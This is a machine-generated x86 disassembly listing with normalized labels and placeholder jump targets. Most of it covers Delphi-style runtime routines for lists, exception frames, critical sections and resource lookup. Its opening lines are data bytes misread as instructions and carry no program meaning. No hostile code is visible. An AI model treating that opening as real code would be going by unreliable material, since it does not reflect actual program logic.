inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x5b ] bh
inc ecx
add [ eax - 0x27ffbe62 ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ esi ] dl
inc ecx
add ah ah
test eax 0xa7100041
inc ecx
add ah bl
leave
inc ecx
add [ edi ] dh
inc ecx
add [ edi - 0x3553ffbf ] bh
inc ecx
add [ edx + ecx * 8 - 0x483fffbf ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x7fffbff0 ] dh
add [ eax ] al
add [ edi ] al
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x4e
inc ecx
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax ] ah
dec esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc esp
and al 0x4
aam 0xe9
push ebx
xchg edx eax
add [ eax ] al
ror [ edi + 0x41 ] 0x1
add bh bl
dec edi
inc ecx
add cl ch
dec edi
inc ecx
add cl cl
dec edi
inc ecx
add bl dh
dec edi
inc ecx
add [ ecx ] al
push eax
inc ecx
add [ ebx ] cl
push eax
inc ecx
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
jns r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e80921
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
pop ebp
retn 0x4
inc ebp
add [ eax ] al
pop eax
sbb [ ebx + 0x59ec86e2 ] cl
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
mov bh 0x92
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd8
add bh bh
sub_415348
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4071b8
pop edi
pop esi
pop ebx
retn
sub_415370
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40719c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_415398
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4071d8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_415490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4167c8
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_404190
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_404190
test al al
je r-xdata
sub_4154f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_415490
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415490
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_404190
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_415560
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_416668
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4155bc
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
mov eax [ esi + 0x4 ]
call sub_403f64
mov eax [ esi + 0x8 ]
call sub_403f64
mov eax [ esi + 0xc ]
call sub_403f64
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4155fc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
xor edi edi
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
test esi esi
jl r-xdata
inc ebp
xor esi esi
mov edx esi
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebp
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4167c8
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403e58
test al al
jne r-xdata
sub_415664
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4167c8
mov edx eax
mov eax ebp
call sub_404190
test al al
jne r-xdata
sub_4156a8
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415758
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403e44
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4050a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4155fc
test eax eax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_416668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41575f
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x4 ] eax
sub_415768
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_416824
test eax eax
setge al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_41578c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_406480
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4157ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4167c8
mov edx edi
call sub_41578c
test al al
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4166b4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4167c8
mov edx edi
call sub_41578c
test al al
je r-xdata
mov ebx eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4166b4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41578c
test al al
je r-xdata
sub_415858
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4167c8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_415664
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4158a4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_415560
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_416668
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_415918
push ebx
push esi
push edi
push ebp
call sub_404330
mov ebx edx
mov ebp eax
lea eax [ ebp + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_403f54
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4042d8
inc esi
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4167c8
call sub_403f64
inc edi
dec esi
jne r-xdata
sub_415978
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4167c8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_4154f0
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4159bc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_4155fc
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4167c8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_415a00
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_415a83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_403e44
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a8a
lea eax [ ebp - 0x10c ]
call sub_404e44
retn
sub_415a90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_415978
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_415484
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_415a00
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4167c8
mov ebx eax
cmp ebx [ ebp - 0x10 ]
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4167c8
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404190
test al al
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_415978
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4166b4
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_416668
sub_415b80
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
movzx eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4167c8
mov edx ebp
call sub_415768
test al al
jne r-xdata
sub_415bc4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_415560
mov edx eax
mov eax [ edi + 0x4 ]
call sub_416668
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4167c8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_416824
test eax eax
jge r-xdata
sub_415c20
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4167c8
mov esi eax
mov edx ebp
mov eax esi
call sub_4157ac
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403f64
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4166b4
sub_415c70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_415d6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_404288
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415d76
mov eax [ rw-data ]
call sub_415c14
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416668
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4167c8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_415664
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_416668
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4167c8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_415d76
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_415d9c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_415dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_415b5c
xor edx edx
push ebp
push sub_415e43
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_415c14
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_404884
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4167c8
mov edx [ ebp - 0x4 ]
call sub_4155fc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415e60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_415ec0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ec7
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_415ecc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_415f12
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4159bc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f19
mov eax [ rw-data ]
call sub_415c14
retn
sub_415f20
push ebx
push esi
mov esi eax
mov eax esi
call sub_415ecc
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_415e60
sub_415f40
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_415fa5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_415b80
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_415b68
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415fac
mov eax [ rw-data ]
call sub_415c14
retn
mov eax ebx
call sub_403ef0
mov ebx eax
sub_415fb0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_415ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415c20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ff9
mov eax [ rw-data ]
call sub_415c14
retn
sub_415ffc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_41603e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_415bc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416045
mov eax [ rw-data ]
call sub_415c14
retn
sub_416048
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_41608f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_415a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416096
mov eax [ rw-data ]
call sub_415c14
retn
sub_41609c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_415b5c
xor eax eax
push ebp
push sub_4160ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_415858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4160f1
mov eax [ rw-data ]
call sub_415c14
retn
sub_416150
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_404288
pop ebp
retn 0x8
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_416188
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416150
mov edx eax
mov eax [ rw-data ]
call sub_416b08
pop edi
pop esi
pop ebx
retn
sub_4161b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_416b90
mov esi eax
xor edx edx
push ebp
push sub_41621e
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_416bf4
retn
mov edx ebx
mov eax esi
call sub_4167c8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_404884
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416230
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_4092e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416270
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_404e98
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4162b4
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_416824
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_416668
sub_41630c
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4167c8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41634c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_41630c
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_416370
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_405324
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419c9c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4163e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_419650
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_4163f4
push ebx
call sub_40710c
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_40710c
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_416668
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov ebx eax
call sub_40710c
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov ebx eax
call sub_40710c
mov [ eax + 0xc ] ebx
sub_41644c
push ebx
push esi
push edi
call sub_40710c
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
